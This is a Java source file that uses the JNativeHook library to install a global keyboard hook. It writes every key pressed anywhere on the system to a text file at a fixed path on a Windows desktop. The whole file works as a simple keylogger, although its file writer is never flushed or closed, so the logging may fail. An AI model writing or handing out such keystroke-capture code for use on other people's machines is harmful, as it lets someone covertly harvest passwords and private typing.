package com.mycompany.jnativehook;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class JNativeHook implements NativeKeyListener {

    public static void main(String[] args) {

        try {
            GlobalScreen.registerNativeHook();

        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        GlobalScreen.addNativeKeyListener(new JNativeHook());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

        String txt = "";
        switch (e.getKeyCode()) {
            case NativeKeyEvent.VC_SPACE -> {
                txt = " ";
            }
            case NativeKeyEvent.VC_ENTER -> {
                txt = "\n";
            }
            case NativeKeyEvent.VC_BACKSPACE -> {
                txt = "";
            }
            case NativeKeyEvent.VC_ESCAPE ->
                System.exit(0);
            default -> {
                txt = NativeKeyEvent.getKeyText(e.getKeyCode());
            }
           
        }
        
        try {
            FileWriter fileW  = new FileWriter(new File("C:\\Users\\lcamp\\Desktop\\documento.txt"),true);
            fileW.write(txt);
        } catch (IOException ex) {
            System.out.println("Error: " + ex.getMessage());
        }
    }
}
